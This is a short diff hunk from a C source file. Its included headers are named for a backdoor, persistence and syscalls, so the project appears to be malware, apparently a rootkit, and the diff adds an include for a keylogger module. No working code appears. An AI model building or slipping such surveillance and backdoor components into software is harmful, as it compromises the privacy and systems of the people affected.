@@ -4,6 +4,7 @@
 #include "backdoor.h"
 #include "common.h"
 #include "list.h"
+#include "keylogger.h"
 #include "misc.h"
 #include "persistence.h"
 #include "syscalls.h"
